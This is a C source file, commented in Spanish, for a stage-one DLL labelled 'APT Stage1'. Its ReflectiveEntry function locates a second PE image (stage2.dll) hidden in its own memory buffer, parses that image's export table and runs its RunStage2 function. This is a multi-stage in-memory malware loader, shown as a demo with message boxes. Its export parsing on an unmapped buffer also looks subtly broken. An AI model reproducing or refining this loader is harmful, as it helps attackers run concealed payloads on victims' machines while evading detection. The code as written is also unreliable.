// ==============================================
//  DLL reflejada. Exporta ReflectiveEntry, carga stage2 desde buffer global
// ==============================================

#include <windows.h>
#include <stdio.h>
#include <string.h>

//  exportada desde stage2.dll
typedef void (*Stage2Func)(void);

// pienso que el buffer original aún existe en memoria y contiene stage2.dll
// En versión avanzada: deberia hacer parsing completo con offset y tamaño del stage2
// Para esta demo: busco el segundo PE dentro del buffer total en memoria

PIMAGE_NT_HEADERS get_nt_headers(BYTE* base) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    return (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
}

BYTE* find_next_pe_header(BYTE* base, size_t size) {
    for (size_t i = 0; i < size - 2; i++) {
        if (base[i] == 'M' && base[i+1] == 'Z') {
            BYTE* candidate = &base[i];
            if (get_nt_headers(candidate)) {
                return candidate;
            }
        }
    }
    return NULL;
}

__declspec(dllexport) void ReflectiveEntry() {
    MessageBoxA(0, "[Stage1] Ejecutando ReflectiveEntry...", "APT Stage1", MB_OK);

    // Obtener base de stage1 (this DLL)
    HMODULE hModule = NULL;
    GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS, (LPCTSTR)&ReflectiveEntry, &hModule);

    MEMORY_BASIC_INFORMATION mbi;
    VirtualQuery(hModule, &mbi, sizeof(mbi));
    BYTE* fullBuffer = (BYTE*)mbi.AllocationBase;

    // Busco el PE header stage2.dll dentro del mismo .dat
    BYTE* stage2_base = find_next_pe_header(fullBuffer + 1, 0x100000);
    if (!stage2_base) {
        MessageBoxA(0, "[Stage1] PE stage2.dll no encontrado.", "ERROR", MB_OK);
        return;
    }

    // Analizar y ejecutar RunStage2
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)stage2_base;
    PIMAGE_NT_HEADERS nt = get_nt_headers(stage2_base);
    DWORD rva_export = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)(stage2_base + rva_export);

    DWORD* funcs = (DWORD*)(stage2_base + exp->AddressOfFunctions);
    DWORD* names = (DWORD*)(stage2_base + exp->AddressOfNames);
    WORD* ords  = (WORD*)(stage2_base + exp->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char* fname = (char*)(stage2_base + names[i]);
        if (strcmp(fname, "RunStage2") == 0) {
            DWORD offset = funcs[ords[i]];
            Stage2Func fn = (Stage2Func)(stage2_base + offset);
            fn();
            return;
        }
    }

    MessageBoxA(0, "[Stage1] No se encontró RunStage2.", "ERROR", MB_OK);
}
